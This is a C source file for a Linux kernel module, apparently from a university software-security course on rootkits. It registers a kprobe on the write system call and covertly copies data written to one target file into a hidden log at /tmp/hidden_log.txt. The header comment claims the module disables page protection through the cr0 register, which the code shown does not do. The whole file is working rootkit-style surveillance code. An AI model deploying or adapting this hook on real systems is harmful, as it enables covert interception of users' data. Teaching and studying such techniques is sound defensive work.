/*
 * syscall-steal.c
 *
 * System call "stealing" sample.
 *
 * Disables page protection at a processor level by changing the 16th bit
 * in the cr0 register (could be Intel specific).
 */

#include <linux/delay.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h> /* which will have params */
#include <linux/unistd.h>      /* The list of system calls */
#include <linux/cred.h>        /* For current_uid() */
#include <linux/uidgid.h>      /* For __kuid_val() */
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/fcntl.h>
#include <linux/file.h>    /* For fget and fput */
#include <linux/fdtable.h> /* For fget and fput */
#include <linux/sched.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h> /* Ensure kprobes header is included */

#define TARGET_FILE "/home/rootkit/IntroToSoftwareSec/Rootkit-8/log.txt"

static char *syscall_sym = "__x64_sys_write";
module_param(syscall_sym, charp, 0644);

static int sys_call_kprobe_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    struct file *log_file;
    char buf[256] = {0};
    char path_buf[PATH_MAX] = {0};
    char *path;

    struct pt_regs *real_regs;
    unsigned int fd;
    const char __user *user_buf;
    size_t count;

    real_regs = (struct pt_regs *)regs->di;
    if (!real_regs) {
        pr_info("Invalid regs pointer\n");
        return 0;
    }

    fd = (unsigned int)real_regs->di;
    user_buf = (const char __user *)real_regs->si;
    count = (size_t)real_regs->dx;

    if (fd >= 1024) {
        pr_info("File descriptor %u out of usual range\n", fd);
        return 0;
    }

    struct fd f = fdget(fd);
    if (!f.file) {
        pr_info("Invalid file descriptor %d\n", fd);
        return 0;
    }

    path = d_path(&f.file->f_path, path_buf, PATH_MAX);
    if (IS_ERR(path)) {
        pr_info("Error getting path for fd %d: %ld\n", fd, PTR_ERR(path));
        fdput(f);
        return 0;
    }

    if (strcmp(path, TARGET_FILE) != 0) {
        fdput(f);
        return 0;
    }

    pr_info("Matched target file! Logging write operation\n");

    if (count > 0 && user_buf) {
        char tmp_buf[128] = {0};
        size_t to_copy = min_t(size_t, count, sizeof(tmp_buf) - 1);

        if (copy_from_user(tmp_buf, user_buf, to_copy) == 0) {
            snprintf(buf, sizeof(buf), "Process %d wrote: %.100s\n",
                     current->pid, tmp_buf);
        } else {
            snprintf(buf, sizeof(buf), "Process %d wrote to file (copy failed)\n",
                     current->pid);
        }
    } else {
        snprintf(buf, sizeof(buf), "Process %d wrote %zu bytes\n",
                 current->pid, count);
    }

    log_file = filp_open("/tmp/hidden_log.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(log_file)) {
        pr_err("Failed to open hidden log file: %ld\n", PTR_ERR(log_file));
        fdput(f);
        return 0;
    }

    kernel_write(log_file, buf, strlen(buf), &log_file->f_pos);

    filp_close(log_file, NULL);
    fdput(f);

    return 0;
}

static struct kprobe syscall_kprobe = {
    .symbol_name = "__x64_sys_write",
    .pre_handler = sys_call_kprobe_pre_handler,
};

static int __init syscall_steal_start(void)
{
    int err;
    pr_info("Module loading with kernel %d.%d.%d\n",
            (LINUX_VERSION_CODE >> 16),
            ((LINUX_VERSION_CODE >> 8) & 0xFF),
            (LINUX_VERSION_CODE & 0xFF));

    syscall_kprobe.symbol_name = syscall_sym;
    err = register_kprobe(&syscall_kprobe);
    if (err) {
        pr_err("register_kprobe() on %s failed: %d\n", syscall_sym, err);
        return err;
    }
    pr_info("Registered kprobe for %s\n", syscall_sym);
    pr_info("Logging all write syscalls to /tmp/hidden_log.txt\n");
    return 0;
}

static void __exit syscall_steal_end(void)
{
    unregister_kprobe(&syscall_kprobe);
    pr_info("Unregistered kprobe for %s\n", syscall_sym);
    msleep(2000);
}

module_init(syscall_steal_start);
module_exit(syscall_steal_end);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Imri Shai And Hagay Cohen");
MODULE_DESCRIPTION("Write to specific file hook");

